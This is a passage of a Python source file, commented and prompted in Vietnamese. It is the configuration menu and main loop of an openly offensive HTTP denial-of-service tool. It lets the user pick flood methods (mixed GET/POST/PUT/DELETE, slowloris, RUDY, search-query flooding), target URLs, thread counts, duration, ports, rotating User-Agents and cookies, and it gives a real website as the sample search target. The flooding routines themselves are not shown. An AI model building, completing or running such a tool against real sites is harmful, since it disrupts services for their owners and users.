    if phuong_thuc_tan_cong == "2":
        phuong_thuc_tan_cong = "mixed"
        chon_phuong_thuc = Prompt.ask(
            "Chọn các phương thức HTTP tấn công, cách nhau bởi dấu phẩy (ví dụ: GET, POST, PUT, DELETE)\n[bold green] Có: GET, POST, PUT, DELETE ")
        if chon_phuong_thuc.upper() == 'ALL':
            methods = ['GET', 'POST', 'PUT', 'DELETE']
        else:
            methods = [method.strip().upper()
                       for method in chon_phuong_thuc.split(',')]

    elif phuong_thuc_tan_cong == "3":
        phuong_thuc_tan_cong = "slowloris"
    elif phuong_thuc_tan_cong == "4":
        phuong_thuc_tan_cong = "rudy"
    elif phuong_thuc_tan_cong == "5":
        phuong_thuc_tan_cong = "search"
        chon_nhap_url_search = Prompt.ask("[deep_sky_blue1 bold]Chọn cách nhập URL tìm kiếm[/]:\n[bold orange1]1.[/] Từ file\n[bold orange1]2.[/] Nhập thủ công", choices=["1", "2"], default="1")
        if chon_nhap_url_search == "1":
            ten_file_url_search = Prompt.ask("Nhập tên file chứa danh sách URL tìm kiếm (ví dụ: search_urls.txt)")
            search_url_bases = doc_danh_sach_url(ten_file_url_search)
        else:
            url_search_thu_cong = Prompt.ask("Nhập URL cơ sở cho tìm kiếm (ví dụ: https://yurineko.my/search?query=)")
            search_url_bases = [url_search_thu_cong]
        if not search_url_bases:
            console.print("Không có URL tìm kiếm nào. Kết thúc.", style="yellow")
            return [], 0, 0, 0, "1", [], [], None, False, {}, []
        else:
            them_tu_khoa = Confirm.ask(
                "Có muốn thêm từ khóa tìm kiếm (nếu không sẽ là random từ khóa)?")
            if them_tu_khoa:
                tu_khoa = Prompt.ask(
                    "Nhập từ khóa tìm kiếm, cách nhau bởi dấu phẩy (ví dụ: 'python, web, security'): ")
                search_keywords = [kw.strip()
                                for kw in tu_khoa.split(',')]
            else:
                search_keywords = [chr(random.randint(97, 122))
                                    for _ in range(50)]
    else:
        phuong_thuc_tan_cong = "get"

    them_cookie = Confirm.ask("Có muốn thêm cookie vào request?")
    if them_cookie:
        cookie_value = Prompt.ask(
            "Nhập giá trị cookie (ví dụ: 'key1=value1; key2=value2')")
        custom_headers['Cookie'] = cookie_value

    if phuong_thuc_tan_cong in ("slowloris", "rudy"):
        for url in danh_sach_muc_tieu:
            chon_cach_lay_headers = Prompt.ask(
                f"[deep_sky_blue1 bold]Chọn cách lấy headers cho {url} (Phương thức {phuong_thuc_tan_cong})[/]:\n[bold orange1]1.[/] Tự động (Mặc định)\n[bold orange1]2.[/] Thủ công",
                choices=["1", "2"],
                default="1"
            )
            cach_lay_headers[url] = "auto" if chon_cach_lay_headers == "1" else "custom"

    chon_user_agent = Prompt.ask("[deep_sky_blue1 bold]User-Agent[/]:\n[bold orange1]1.[/] Từ file (user_agents.txt)\n[bold orange1]2.[/] Nhập thủ công\n", choices=["1", "2"], default="1")
    if chon_user_agent == "1":
        ten_file_user_agent = Prompt.ask("Nhập tên file chứa User-Agent (ví dụ: user_agents.txt)")
        danh_sach_user_agent_lon = doc_danh_sach_user_agent(ten_file_user_agent)
        if danh_sach_user_agent_lon:
            is_user_agent_from_file = True
            user_agent_duoc_chon = ten_file_user_agent
        else:
            is_user_agent_from_file = False
            user_agent_duoc_chon = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
            console.print(f"[yellow]File User-Agent không hợp lệ. Sử dụng User-Agent mặc định.[/]")

    else:
        user_agent_thu_cong = Prompt.ask("Nhập User-Agent thủ công")
        is_user_agent_from_file = False
        user_agent_duoc_chon = user_agent_thu_cong

    if not is_user_agent_from_file or not danh_sach_user_agent_lon:  
        custom_headers['User-Agent'] = user_agent_duoc_chon 
    else: 
      custom_headers['User-Agent'] = lay_ngau_nhien_user_agent()
    if phuong_thuc_tan_cong == "slowloris":
        chon_cong = Prompt.ask(
            "[deep_sky_blue1 bold]Chọn cổng tấn công[/]:\n[bold orange1]1.[/] 80 (HTTP)\n[bold orange1]2.[/] 443 (HTTPS)\n[bold orange1]3.[/] Cả hai", choices=["1", "2", "3"], default="3")

        if chon_cong == "1":
            ports = [80]
        elif chon_cong == "2":
            ports = [443]
        else:
            ports = [80, 443]

    luu_log = Confirm.ask("Lưu log khi kết thúc không?")
    os.system('cls' if os.name == 'nt' else 'clear')
    in_bieu_tuong(bieu_tuong)
    console.print(Panel(f"[bold green]✓[/] Đã thiết lập:\n - Phương thức tấn công: {phuong_thuc_tan_cong}\n - Danh sách mục tiêu: {danh_sach_muc_tieu}\n - Số luồng: {so_luong_luong}\n - Tốc độ làm mới: {toc_do_lam_moi}\n - Thời gian tấn công: {thoi_gian_tan_cong}\n - Phương thức: {methods}\n - URL tìm kiếm: {search_url_bases}\n - Từ khóa: {search_keywords}\n - Lưu log: {luu_log}", style="light_steel_blue1"))
    hien_thi_lua_chon()
    if phuong_thuc_tan_cong == "slowloris":
        print(f"    └─── [bold]PORTS[/]: [deep_sky_blue1]{ports}[/]")

    return danh_sach_muc_tieu, so_luong_luong, thoi_gian_tan_cong, toc_do_lam_moi, phuong_thuc_tan_cong, methods, search_url_bases, search_keywords, luu_log, custom_headers, ports

async def main():
    """Hàm main chạy chương trình chính."""

    global dung_tan_cong, yeu_cau_thanh_cong, yeu_cau_that_bai, tong_so_yeu_cau, toc_do_lam_moi, thoi_gian_da_troi, luu_log, custom_headers

    try:
        danh_sach_muc_tieu, so_luong_luong, thoi_gian_tan_cong, toc_do_lam_moi, phuong_thuc_tan_cong, methods, search_url_bases, search_keywords, luu_log, custom_headers, ports = nhap_tham_so()
        if not danh_sach_muc_tieu:
            console.print(
                "Không có URL nào để tấn công. Kết thúc.", style="bold red")
            return

        console.print(Panel(
            "[bold blue]Bắt đầu tấn công...[/]", style="light_steel_blue1"))
        print("=" * 55)

        luong_trang_thai = threading.Thread(
            target=in_trang_thai, args=(danh_sach_muc_tieu, so_luong_luong, thoi_gian_tan_cong))
        luong_trang_thai.daemon = True
        luong_trang_thai.start()

        log_message(f"Kịch bản tấn công đã bắt đầu: \n- Phương thức: {phuong_thuc_tan_cong} \n- Thời gian: {thoi_gian_tan_cong} \n- URL: {danh_sach_muc_tieu}\n- Các method: {methods}\n- URL tìm kiếm: {search_url_bases}\n- Từ khóa: {search_keywords} ")

        await tan_cong_tong_the(danh_sach_muc_tieu, so_luong_luong, phuong_thuc_tan_cong, methods, search_url_bases, search_keywords, custom_headers, ports)

        while not dung_tan_cong:
            await asyncio.sleep(1)
            if thoi_gian_tan_cong > 0 and thoi_gian_da_troi >= thoi_gian_tan_cong:
                stop_attack()
                break

    except KeyboardInterrupt:
        stop_attack()

    finally:
        console.print(Panel(
            "[bold green]Tất cả các luồng đã dừng, kịch bản kết thúc.[/]", style="light_steel_blue1"))
        print("=" * 55)

        if luu_log:
            console.print(
                f"Đã lưu log vào file [bold blue]attack_log.txt[/].", style="light_steel_blue1")

        input("Nhấn Enter để thoát...")

if __name__ == "__main__":
    asyncio.run(main())